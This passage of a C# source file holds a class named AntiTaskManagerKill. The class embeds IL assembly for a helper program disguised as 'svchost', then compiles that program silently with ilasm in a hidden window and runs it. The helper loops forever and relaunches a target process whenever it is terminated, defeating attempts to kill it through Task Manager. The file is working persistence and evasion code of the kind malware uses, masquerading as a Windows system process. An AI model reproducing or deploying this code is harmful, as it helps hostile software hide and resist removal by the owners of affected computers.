@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService" + newLine +
@"                                                                                                       73 00 00 )                                        // s.." + newLine +
@"    .get class svchost.My.MyProject/MyWebServices svchost.My.MyProject::get_WebServices()" + newLine +
@"  } // end of property MyProject::WebServices" + newLine +
@"} // end of class svchost.My.MyProject" + newLine +
@"" + newLine +
@".class public auto ansi beforefieldinit svchost.Anti_Task_Manager_Kill" + newLine +
@"       extends [mscorlib]System.Object" + newLine +
@"{" + newLine +
@"  .field public static string PRO_Name" + newLine +
@"  .method private specialname rtspecialname static " + newLine +
@"          void  .cctor() cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       12 (0xc)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  ldstr      ""%ProName%""" + newLine +
@"    IL_0005:  stsfld     string svchost.Anti_Task_Manager_Kill::PRO_Name" + newLine +
@"    IL_000a:  nop" + newLine +
@"    IL_000b:  ret" + newLine +
@"  } // end of method Anti_Task_Manager_Kill::.cctor" + newLine +
@"" + newLine +
@"  .method public specialname rtspecialname " + newLine +
@"          instance void  .ctor() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       9 (0x9)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  ldarg.0" + newLine +
@"    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()" + newLine +
@"    IL_0006:  nop" + newLine +
@"    IL_0007:  nop" + newLine +
@"    IL_0008:  ret" + newLine +
@"  } // end of method Anti_Task_Manager_Kill::.ctor" + newLine +
@"" + newLine +
@"  .method public static void  Main() cil managed" + newLine +
@"  {" + newLine +
@"    .entrypoint" + newLine +
@"    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       14 (0xe)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     string svchost.Anti_Task_Manager_Kill::PRO_Name" + newLine +
@"    IL_0006:  call       void svchost.AntiTaskManagerKill::GetPro(string)" + newLine +
@"    IL_000b:  nop" + newLine +
@"    IL_000c:  nop" + newLine +
@"    IL_000d:  ret" + newLine +
@"  } // end of method Anti_Task_Manager_Kill::Main" + newLine +
@"" + newLine +
@"} // end of class svchost.Anti_Task_Manager_Kill" + newLine +
@"" + newLine +
@".class private auto ansi sealed svchost.AntiTaskManagerKill" + newLine +
@"       extends [mscorlib]System.Object" + newLine +
@"{" + newLine +
@"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .field private static class [System]System.Diagnostics.Process[] ProList" + newLine +
@"  .method public static void  GetPro(string Proc) cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       123 (0x7b)" + newLine +
@"    .maxstack  3" + newLine +
@"    .locals init (string V_0," + newLine +
@"             class [System]System.Diagnostics.Process V_1," + newLine +
@"             class [System]System.ComponentModel.Win32Exception V_2," + newLine +
@"             int32 V_3," + newLine +
@"             class [System]System.Diagnostics.Process[] V_4," + newLine +
@"             bool V_5)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  nop" + newLine +
@"    IL_0002:  nop" + newLine +
@"    IL_0003:  ldarg.0" + newLine +
@"    IL_0004:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)" + newLine +
@"    IL_0009:  stloc.s    V_4" + newLine +
@"    IL_000b:  ldc.i4.0" + newLine +
@"    IL_000c:  stloc.3" + newLine +
@"    IL_000d:  br.s       IL_005a" + newLine +
@"" + newLine +
@"    IL_000f:  ldloc.s    V_4" + newLine +
@"    IL_0011:  ldloc.3" + newLine +
@"    IL_0012:  ldelem.ref" + newLine +
@"    IL_0013:  stloc.1" + newLine +
@"    IL_0014:  nop" + newLine +
@"    .try" + newLine +
@"    {" + newLine +
@"      IL_0015:  ldloc.1" + newLine +
@"      IL_0016:  callvirt   instance class [System]System.Diagnostics.ProcessModuleCollection [System]System.Diagnostics.Process::get_Modules()" + newLine +
@"      IL_001b:  ldc.i4.0" + newLine +
@"      IL_001c:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.ProcessModuleCollection::get_Item(int32)" + newLine +
@"      IL_0021:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()" + newLine +
@"      IL_0026:  stloc.0" + newLine +
@"      IL_0027:  leave.s    IL_004c" + newLine +
@"" + newLine +
@"    }  // end .try" + newLine +
@"    catch [System]System.ComponentModel.Win32Exception " + newLine +
@"    {" + newLine +
@"      IL_0029:  dup" + newLine +
@"      IL_002a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)" + newLine +
@"      IL_002f:  stloc.2" + newLine +
@"      IL_0030:  nop" + newLine +
@"      IL_0031:  ldstr      ""n/a""" + newLine +
@"      IL_0036:  stloc.0" + newLine +
@"      IL_0037:  ldloc.2" + newLine +
@"      IL_0038:  callvirt   instance string [mscorlib]System.Exception::ToString()" + newLine +
@"      IL_003d:  ldc.i4.0" + newLine +
@"      IL_003e:  ldnull" + newLine +
@"      IL_003f:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object," + newLine +
@"                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle," + newLine +
@"                                                                                                                                                                object)" + newLine +
@"      IL_0044:  pop" + newLine +
@"      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()" + newLine +
@"      IL_004a:  leave.s    IL_004c" + newLine +
@"" + newLine +
@"    }  // end handler" + newLine +
@"    IL_004c:  nop" + newLine +
@"    IL_004d:  ldloc.0" + newLine +
@"    IL_004e:  ldarg.0" + newLine +
@"    IL_004f:  call       void svchost.AntiTaskManagerKill::CheckRun(string," + newLine +
@"                                                                    string)" + newLine +
@"    IL_0054:  nop" + newLine +
@"    IL_0055:  ldloc.3" + newLine +
@"    IL_0056:  ldc.i4.1" + newLine +
@"    IL_0057:  add.ovf" + newLine +
@"    IL_0058:  stloc.3" + newLine +
@"    IL_0059:  nop" + newLine +
@"    IL_005a:  ldloc.3" + newLine +
@"    IL_005b:  ldloc.s    V_4" + newLine +
@"    IL_005d:  ldlen" + newLine +
@"    IL_005e:  conv.ovf.i4" + newLine +
@"    IL_005f:  clt" + newLine +
@"    IL_0061:  stloc.s    V_5" + newLine +
@"    IL_0063:  ldloc.s    V_5" + newLine +
@"    IL_0065:  brtrue.s   IL_000f" + newLine +
@"" + newLine +
@"    IL_0067:  ldstr      ""1000""" + newLine +
@"    IL_006c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)" + newLine +
@"    IL_0071:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)" + newLine +
@"    IL_0076:  nop" + newLine +
@"    IL_0077:  br.s       IL_0002" + newLine +
@"" + newLine +
@"    IL_0079:  nop" + newLine +
@"    IL_007a:  ret" + newLine +
@"  } // end of method AntiTaskManagerKill::GetPro" + newLine +
@"" + newLine +
@"  .method private static void  CheckRun(string Path," + newLine +
@"                                        string Proc) cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       77 (0x4d)" + newLine +
@"    .maxstack  2" + newLine +
@"    .locals init (class [System]System.Diagnostics.ProcessStartInfo V_0," + newLine +
@"             bool V_1)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  br.s       IL_0046" + newLine +
@"" + newLine +
@"    IL_0003:  ldarg.1" + newLine +
@"    IL_0004:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)" + newLine +
@"    IL_0009:  stsfld     class [System]System.Diagnostics.Process[] svchost.AntiTaskManagerKill::ProList" + newLine +
@"    IL_000e:  ldsfld     class [System]System.Diagnostics.Process[] svchost.AntiTaskManagerKill::ProList" + newLine +
@"    IL_0013:  ldlen" + newLine +
@"    IL_0014:  conv.ovf.i4" + newLine +
@"    IL_0015:  ldc.i4.0" + newLine +
@"    IL_0016:  cgt" + newLine +
@"    IL_0018:  stloc.1" + newLine +
@"    IL_0019:  ldloc.1" + newLine +
@"    IL_001a:  brfalse.s  IL_002e" + newLine +
@"" + newLine +
@"    IL_001c:  ldstr      ""3000""" + newLine +
@"    IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)" + newLine +
@"    IL_0026:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)" + newLine +
@"    IL_002b:  nop" + newLine +
@"    IL_002c:  br.s       IL_0044" + newLine +
@"" + newLine +
@"    IL_002e:  nop" + newLine +
@"    IL_002f:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()" + newLine +
@"    IL_0034:  stloc.0" + newLine +
@"    IL_0035:  ldloc.0" + newLine +
@"    IL_0036:  ldarg.0" + newLine +
@"    IL_0037:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)" + newLine +
@"    IL_003c:  nop" + newLine +
@"    IL_003d:  ldloc.0" + newLine +
@"    IL_003e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)" + newLine +
@"    IL_0043:  pop" + newLine +
@"    IL_0044:  nop" + newLine +
@"    IL_0045:  nop" + newLine +
@"    IL_0046:  ldc.i4.1" + newLine +
@"    IL_0047:  stloc.1" + newLine +
@"    IL_0048:  ldloc.1" + newLine +
@"    IL_0049:  brtrue.s   IL_0003" + newLine +
@"" + newLine +
@"    IL_004b:  nop" + newLine +
@"    IL_004c:  ret" + newLine +
@"  } // end of method AntiTaskManagerKill::CheckRun" + newLine +
@"" + newLine +
@"} // end of class svchost.AntiTaskManagerKill" + newLine +
@"" + newLine +
@".class private auto ansi sealed svchost.My.Resources.Resources" + newLine +
@"       extends [mscorlib]System.Object" + newLine +
@"{" + newLine +
@"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string," + newLine +
@"                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour" + newLine +
@"                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong" + newLine +
@"                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB" + newLine +
@"                                                                                                  75 69 6C 64 65 72 07 34 2E 30 2E 30 2E 30 00 00 ) // uilder.4.0.0.0.." + newLine +
@"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan" + newLine +
@"  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture" + newLine +
@"  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager " + newLine +
@"          get_ResourceManager() cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       59 (0x3b)" + newLine +
@"    .maxstack  2" + newLine +
@"    .locals init (class [mscorlib]System.Resources.ResourceManager V_0," + newLine +
@"             class [mscorlib]System.Resources.ResourceManager V_1," + newLine +
@"             bool V_2)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::resourceMan" + newLine +
@"    IL_0006:  ldnull" + newLine +
@"    IL_0007:  call       bool [mscorlib]System.Object::ReferenceEquals(object," + newLine +
@"                                                                       object)" + newLine +
@"    IL_000c:  stloc.2" + newLine +
@"    IL_000d:  ldloc.2" + newLine +
@"    IL_000e:  brfalse.s  IL_0030" + newLine +
@"" + newLine +
@"    IL_0010:  ldstr      ""svchost.Resources""" + newLine +
@"    IL_0015:  ldtoken    svchost.My.Resources.Resources" + newLine +
@"    IL_001a:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)" + newLine +
@"    IL_001f:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()" + newLine +
@"    IL_0024:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string," + newLine +
@"                                                                                         class [mscorlib]System.Reflection.Assembly)" + newLine +
@"    IL_0029:  stloc.1" + newLine +
@"    IL_002a:  ldloc.1" + newLine +
@"    IL_002b:  stsfld     class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::resourceMan" + newLine +
@"    IL_0030:  nop" + newLine +
@"    IL_0031:  ldsfld     class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::resourceMan" + newLine +
@"    IL_0036:  stloc.0" + newLine +
@"    IL_0037:  br.s       IL_0039" + newLine +
@"" + newLine +
@"    IL_0039:  ldloc.0" + newLine +
@"    IL_003a:  ret" + newLine +
@"  } // end of method Resources::get_ResourceManager" + newLine +
@"" + newLine +
@"  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo " + newLine +
@"          get_Culture() cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       11 (0xb)" + newLine +
@"    .maxstack  1" + newLine +
@"    .locals init (class [mscorlib]System.Globalization.CultureInfo V_0)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     class [mscorlib]System.Globalization.CultureInfo svchost.My.Resources.Resources::resourceCulture" + newLine +
@"    IL_0006:  stloc.0" + newLine +
@"    IL_0007:  br.s       IL_0009" + newLine +
@"" + newLine +
@"    IL_0009:  ldloc.0" + newLine +
@"    IL_000a:  ret" + newLine +
@"  } // end of method Resources::get_Culture" + newLine +
@"" + newLine +
@"  .method assembly specialname static void " + newLine +
@"          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       9 (0x9)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldarg.0" + newLine +
@"    IL_0002:  stsfld     class [mscorlib]System.Globalization.CultureInfo svchost.My.Resources.Resources::resourceCulture" + newLine +
@"    IL_0007:  nop" + newLine +
@"    IL_0008:  ret" + newLine +
@"  } // end of method Resources::set_Culture" + newLine +
@"" + newLine +
@"  .property class [mscorlib]System.Resources.ResourceManager" + newLine +
@"          ResourceManager()" + newLine +
@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) " + newLine +
@"    .get class [mscorlib]System.Resources.ResourceManager svchost.My.Resources.Resources::get_ResourceManager()" + newLine +
@"  } // end of property Resources::ResourceManager" + newLine +
@"  .property class [mscorlib]System.Globalization.CultureInfo" + newLine +
@"          Culture()" + newLine +
@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) " + newLine +
@"    .set void svchost.My.Resources.Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)" + newLine +
@"    .get class [mscorlib]System.Globalization.CultureInfo svchost.My.Resources.Resources::get_Culture()" + newLine +
@"  } // end of property Resources::Culture" + newLine +
@"} // end of class svchost.My.Resources.Resources" + newLine +
@"" + newLine +
@".class private auto ansi sealed beforefieldinit svchost.My.MySettings" + newLine +
@"       extends [System]System.Configuration.ApplicationSettingsBase" + newLine +
@"{" + newLine +
@"  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) " + newLine +
@"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string," + newLine +
@"                                                                                      string) = ( 01 00 4B 4D 69 63 72 6F 73 6F 66 74 2E 56 69 73   // ..KMicrosoft.Vis" + newLine +
@"                                                                                                  75 61 6C 53 74 75 64 69 6F 2E 45 64 69 74 6F 72   // ualStudio.Editor" + newLine +
@"                                                                                                  73 2E 53 65 74 74 69 6E 67 73 44 65 73 69 67 6E   // s.SettingsDesign" + newLine +
@"                                                                                                  65 72 2E 53 65 74 74 69 6E 67 73 53 69 6E 67 6C   // er.SettingsSingl" + newLine +
@"                                                                                                  65 46 69 6C 65 47 65 6E 65 72 61 74 6F 72 08 31   // eFileGenerator.1" + newLine +
@"                                                                                                  31 2E 30 2E 30 2E 30 00 00 )                      // 1.0.0.0.." + newLine +
@"  .field private static class svchost.My.MySettings defaultInstance" + newLine +
@"  .method private specialname rtspecialname static " + newLine +
@"          void  .cctor() cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       22 (0x16)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  newobj     instance void svchost.My.MySettings::.ctor()" + newLine +
@"    IL_0005:  call       class [System]System.Configuration.SettingsBase [System]System.Configuration.SettingsBase::Synchronized(class [System]System.Configuration.SettingsBase)" + newLine +
@"    IL_000a:  castclass  svchost.My.MySettings" + newLine +
@"    IL_000f:  stsfld     class svchost.My.MySettings svchost.My.MySettings::defaultInstance" + newLine +
@"    IL_0014:  nop" + newLine +
@"    IL_0015:  ret" + newLine +
@"  } // end of method MySettings::.cctor" + newLine +
@"" + newLine +
@"  .method public specialname rtspecialname " + newLine +
@"          instance void  .ctor() cil managed" + newLine +
@"  {" + newLine +
@"    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"    // Code size       9 (0x9)" + newLine +
@"    .maxstack  8" + newLine +
@"    IL_0000:  ldarg.0" + newLine +
@"    IL_0001:  call       instance void [System]System.Configuration.ApplicationSettingsBase::.ctor()" + newLine +
@"    IL_0006:  nop" + newLine +
@"    IL_0007:  nop" + newLine +
@"    IL_0008:  ret" + newLine +
@"  } // end of method MySettings::.ctor" + newLine +
@"" + newLine +
@"  .method public specialname static class svchost.My.MySettings " + newLine +
@"          get_Default() cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       11 (0xb)" + newLine +
@"    .maxstack  1" + newLine +
@"    .locals init (class svchost.My.MySettings V_0)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  ldsfld     class svchost.My.MySettings svchost.My.MySettings::defaultInstance" + newLine +
@"    IL_0006:  stloc.0" + newLine +
@"    IL_0007:  br.s       IL_0009" + newLine +
@"" + newLine +
@"    IL_0009:  ldloc.0" + newLine +
@"    IL_000a:  ret" + newLine +
@"  } // end of method MySettings::get_Default" + newLine +
@"" + newLine +
@"  .property class svchost.My.MySettings Default()" + newLine +
@"  {" + newLine +
@"    .get class svchost.My.MySettings svchost.My.MySettings::get_Default()" + newLine +
@"  } // end of property MySettings::Default" + newLine +
@"} // end of class svchost.My.MySettings" + newLine +
@"" + newLine +
@".class private auto ansi sealed svchost.My.MySettingsProperty" + newLine +
@"       extends [mscorlib]System.Object" + newLine +
@"{" + newLine +
@"  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) " + newLine +
@"  .method assembly specialname static class svchost.My.MySettings " + newLine +
@"          get_Settings() cil managed" + newLine +
@"  {" + newLine +
@"    // Code size       11 (0xb)" + newLine +
@"    .maxstack  1" + newLine +
@"    .locals init (class svchost.My.MySettings V_0)" + newLine +
@"    IL_0000:  nop" + newLine +
@"    IL_0001:  call       class svchost.My.MySettings svchost.My.MySettings::get_Default()" + newLine +
@"    IL_0006:  stloc.0" + newLine +
@"    IL_0007:  br.s       IL_0009" + newLine +
@"" + newLine +
@"    IL_0009:  ldloc.0" + newLine +
@"    IL_000a:  ret" + newLine +
@"  } // end of method MySettingsProperty::get_Settings" + newLine +
@"" + newLine +
@"  .property class svchost.My.MySettings Settings()" + newLine +
@"  {" + newLine +
@"    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 53 65 74 74 69 6E 67 73 00 00 ) // ...My.Settings.." + newLine +
@"    .get class svchost.My.MySettings svchost.My.MySettingsProperty::get_Settings()" + newLine +
@"  } // end of property MySettingsProperty::Settings" + newLine +
@"} // end of class svchost.My.MySettingsProperty" + newLine +
@"" + newLine +
@"" + newLine +
@"// =============================================================" + newLine +
@"" + newLine +
@"// *********** DISASSEMBLY COMPLETE ***********************";
        #endregion;

        #region "Enums"
        public enum SearchMethod
        {
            Process,
            File
        }
        #endregion

        #region "Functions"
        public AntiTaskManagerKill(string processName)
        {
            this.ProcessName = processName;
        }

        public string Start(bool force = false)
        {
            try
            {
                if (force)
                    CheckFiles(true);

                bool isRunning = false;

                string runningResult = IsRunning(SearchMethod.Process).ToLower();

                if (runningResult != "true" && runningResult != "false")
                {
                    runningResult = IsRunning(SearchMethod.File).ToLower();

                    if (runningResult != "true" && runningResult != "false")
                    {
                        return "Error running detection";
                    }

                    isRunning = Convert.ToBoolean(runningResult);
                }
                else
                {
                    isRunning = Convert.ToBoolean(runningResult);
                }

                if (isRunning)
                    return "Already running";

                if (!File.Exists(FilePathEXE))
                {
                    File.WriteAllBytes(FileResourcePath, Convert.FromBase64String(FileResource));
                    File.WriteAllText(FilePathIL, KIL.Replace(@"%ProName%", ProcessName));

                    ProcessStartInfo compileProc = new ProcessStartInfo()
                    {
                        FileName = Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\Framework\v2.0.50727\ilasm.exe",
                        Arguments = $"/alignment=512 /QUIET {FilePathIL} /output:{FilePathEXE}",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(compileProc).WaitForExit();

                    CheckFiles();

                    Process.Start(FilePathEXE);
                }
                else
                {
                    Process.Start(FilePathEXE);
                }

                return "OK";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public string Stop()
        {
            try
            {
                UnlockFile(FilePathEXE);
                CheckFiles(true);

                return "OK";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public string IsRunning(SearchMethod method)
        {
            try
            {
                string FullPath = FilePathEXE;
                string FilePath = Path.GetDirectoryName(FullPath).ToLower();
                string FileName = Path.GetFileNameWithoutExtension(FullPath).ToLower();

                if (!File.Exists(FullPath))
                    return false.ToString();

                bool isRunning = false;

                Process[] pList = (method == SearchMethod.Process) ? Process.GetProcessesByName(FileName) : FileUtil.LockList(FullPath).ToArray();

                foreach (Process p in pList)
                {
                    try
                    {
                        if (p.MainModule.FileName.ToLower().StartsWith(FilePath, StringComparison.InvariantCultureIgnoreCase))
                        {
                            isRunning = true;
                            break;
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }

                return isRunning.ToString();
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        private void UnlockFile(string filePath)
        {
            try
            {
                var procList = FileUtil.LockList(filePath);

                if (procList.Count() <= 0)
                    return;

                foreach (var proc in procList)
                {
                    proc.Kill();
                }
            }
            catch { }
        }

        private void CheckFiles(bool deleteExe = false)
        {
            if (File.Exists(FilePathIL))
            {
                UnlockFile(FilePathIL);
                File.Delete(FilePathIL);
            }

            if (File.Exists(FileResourcePath))
            {
                UnlockFile(FileResourcePath);
                File.Delete(FileResourcePath);
            }

            if (deleteExe && File.Exists(FilePathEXE))
            {
                UnlockFile(FilePathEXE);
                File.Delete(FilePathEXE);
            }
        }
        #endregion
    }
}
